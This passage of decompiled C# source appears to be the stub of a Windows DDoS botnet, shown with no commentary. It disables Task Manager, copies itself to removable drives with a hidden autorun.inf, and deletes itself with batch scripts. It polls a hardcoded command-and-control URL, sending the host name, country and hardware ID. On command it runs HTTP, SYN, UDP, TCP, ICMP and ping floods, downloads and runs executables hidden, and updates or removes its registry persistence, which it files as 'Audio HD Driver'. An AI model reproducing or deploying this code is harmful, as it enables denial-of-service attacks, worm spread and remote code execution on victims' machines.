					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
		}
		if (bool_18)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array3 = drives;
				foreach (DriveInfo driveInfo in array3)
				{
					if (driveInfo.DriveType == DriveType.Removable)
					{
						string fileName2 = Process.GetCurrentProcess().MainModule!.FileName;
						if (File.Exists(driveInfo.Name + "autorun.exe"))
						{
							File.Delete(driveInfo.Name + "autorun.exe");
						}
						FileStream fileStream4 = new FileStream(fileName2, FileMode.Open, FileAccess.Read);
						byte[] array4 = new byte[fileStream4.Length];
						fileStream4.Read(array4, 0, array4.Length);
						fileStream4.Close();
						FileStream fileStream5 = new FileStream(driveInfo.Name + "autorun.exe", FileMode.Create);
						fileStream5.Write(array4, 0, array4.Length);
						fileStream5.Close();
						fileStream5.Dispose();
						File.SetAttributes(driveInfo.Name + "autorun.exe", File.GetAttributes(driveInfo.Name + "autorun.exe") | FileAttributes.Hidden);
						if (File.Exists(driveInfo.Name + "autorun.inf"))
						{
							File.Delete(driveInfo.Name + "autorun.inf");
						}
						StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine("open=autorun.exe");
						streamWriter.Close();
						File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
		}
		if (bool_15)
		{
			try
			{
				if (!Application.get_ExecutablePath().Contains(Environment.GetEnvironmentVariable("TEMP")))
				{
					string value = ":Repeat\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat";
					TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
					textWriter.WriteLine(value);
					textWriter.Close();
					Process process2 = new Process();
					process2.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
					string value2 = "start \"\" " + Environment.GetEnvironmentVariable("TEMP") + "\\" + string_2;
					TextWriter textWriter2 = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\start.bat");
					textWriter2.WriteLine(value2);
					textWriter2.Close();
					Process process3 = new Process();
					process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\start.bat";
					process3.StartInfo.UseShellExecute = false;
					process3.StartInfo.CreateNoWindow = true;
					process3.Start();
					smethod_10();
				}
			}
			catch
			{
			}
		}
		while (true)
		{
			try
			{
				string string_ = "pcname=" + string_7 + "&botver=" + string_6 + "&country=" + string_9 + "&winver=" + string_8 + "&hwid=" + string_10;
				string text5 = smethod_0(string_0, string_);
				if (text5.Length != 0)
				{
					if (text5 != string_11)
					{
						smethod_11(text5);
						string_11 = text5;
					}
				}
				else
				{
					string_11 = string.Empty;
					try
					{
						Class0.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class1.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class2.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class3.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class4.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class5.smethod_1();
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(Convert.ToInt32(string_1) * 60000);
		}
	}

	private static void smethod_11(string string_12)
	{
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = string_12.Split(new char[1] { '*' });
			string[] array2 = new string[3] { "coding-revolution.net", "codrevauth.net", "madafacka.com" };
			for (int i = 0; i < array2.Length; i++)
			{
				if (array[1].Contains(array2[i]))
				{
					smethod_10();
				}
			}
			switch (array[0])
			{
			case "test":
				try
				{
					MessageBox.Show("Test works");
					break;
				}
				catch
				{
					break;
				}
			case "httpflood":
				try
				{
					Class0.string_0 = array[1];
					Class0.int_0 = Convert.ToInt32(array[2]);
					Class0.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "synflood":
				try
				{
					Class1.string_0 = array[1];
					Class1.int_0 = Convert.ToInt32(array[2]);
					Class1.int_1 = Convert.ToInt32(array[3]);
					Class1.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "udpflood":
				try
				{
					Class2.string_0 = array[1];
					Class2.int_0 = Convert.ToInt32(array[2]);
					Class2.int_1 = Convert.ToInt32(array[3]);
					Class2.int_2 = 1;
					Class2.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "tcpflood":
				try
				{
					Class3.string_0 = array[1];
					Class3.int_0 = Convert.ToInt32(array[2]);
					Class3.int_1 = Convert.ToInt32(array[3]);
					Class3.int_2 = Convert.ToInt32(array[4]);
					Class3.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "icmpflood":
				try
				{
					Class4.string_0 = array[1];
					Class4.int_0 = Convert.ToInt32(array[2]);
					Class4.int_1 = Convert.ToInt32(array[3]);
					Class4.int_2 = 1;
					Class4.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "pingflood":
				try
				{
					Class5.string_0 = array[1];
					Class5.int_0 = Convert.ToInt32(array[2]);
					Class5.int_1 = Convert.ToInt32(array[3]);
					Class5.smethod_0();
					break;
				}
				catch
				{
					break;
				}
			case "downandexe":
				try
				{
					string text = gclass0_0.vmethod_0(12) + ".exe";
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[1], Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
					Process process3 = new Process();
					process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
					process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process3.Start();
					break;
				}
				catch
				{
					break;
				}
			case "visit":
				try
				{
					Process process2 = new Process();
					process2.StartInfo = new ProcessStartInfo(array[1]);
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.Start();
					break;
				}
				catch
				{
					break;
				}
			case "update":
				try
				{
					string text2 = gclass0_0.vmethod_0(12) + ".exe";
					WebClient webClient2 = new WebClient();
					webClient2.DownloadFile(array[1], Environment.GetEnvironmentVariable("TEMP") + "\\" + text2);
					string value2 = "start \"\" " + Environment.GetEnvironmentVariable("TEMP") + "\\" + text2;
					TextWriter textWriter2 = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\start.bat");
					textWriter2.WriteLine(value2);
					textWriter2.Close();
					Process process4 = new Process();
					process4.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\start.bat";
					process4.StartInfo.UseShellExecute = false;
					process4.StartInfo.CreateNoWindow = true;
					process4.Start();
				}
				catch
				{
				}
				try
				{
					string value3 = ":Repeat\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat";
					TextWriter textWriter3 = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
					textWriter3.WriteLine(value3);
					textWriter3.Close();
					Process process5 = new Process();
					process5.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
					process5.StartInfo.UseShellExecute = false;
					process5.StartInfo.CreateNoWindow = true;
					process5.Start();
				}
				catch
				{
				}
				smethod_10();
				break;
			case "remove":
				if (array[1] == Environment.MachineName || array[1] == "ALL")
				{
					try
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("Audio HD Driver");
					}
					catch
					{
					}
					try
					{
						Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("Audio HD Driver");
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue("Audio HD Driver");
					}
					catch
					{
					}
					try
					{
						Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue("Audio HD Driver");
					}
					catch
					{
					}
					try
					{
						Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)!.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
					}
					catch
					{
					}
					try
					{
						Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Active Setup\\Installed Components\\{83313942-b21e-454e-b5ae-d01992a63ad5}", writable: true)!.DeleteValue("StubPath");
					}
					catch
					{
					}
					try
					{
						string value = ":Repeat\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat";
						TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
						textWriter.WriteLine(value);
						textWriter.Close();
						Process process = new Process();
						process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.CreateNoWindow = true;
						process.Start();
					}
					catch
					{
					}
					smethod_10();
				}
				break;
			}
		}
		catch
		{
		}
	}

	static Stub()
	{
		Class6.smethod_0();
		gclass0_0 = new GClass0();
		string_0 = "http://travel-master.org/f/connect.php";
		string_1 = "1";
		bool_0 = false;
		bool_1 = false;
		bool_2 = false;
		bool_3 = false;
		bool_4 = false;
		bool_5 = false;
		bool_6 = false;
		bool_7 = false;
		bool_8 = false;
		bool_9 = false;
		bool_10 = false;
		bool_11 = false;
		bool_12 = false;
		bool_13 = false;
		bool_14 = false;
		string_2 = "TkdvQ2mjFJ5.exe";
		bool_15 = false;
		bool_16 = false;
		string_3 = "VALUEFAKEERRORTITLE";
		string_4 = "VALUEFAKEERRORMESSAGE";
		bool_17 = false;
		string_5 = "VALUEDELAYTIME";
		bool_18 = false;
		bool_19 = false;
		bool_20 = false;
		bool_21 = false;
		bool_22 = false;
		string_6 = "2.0";
		string_7 = Environment.MachineName;
		string_8 = smethod_5();
		string_9 = CultureInfo.CurrentUICulture.Name.Substring(3);
		string_10 = smethod_7(smethod_1());
		string_11 = string.Empty;
	}
}
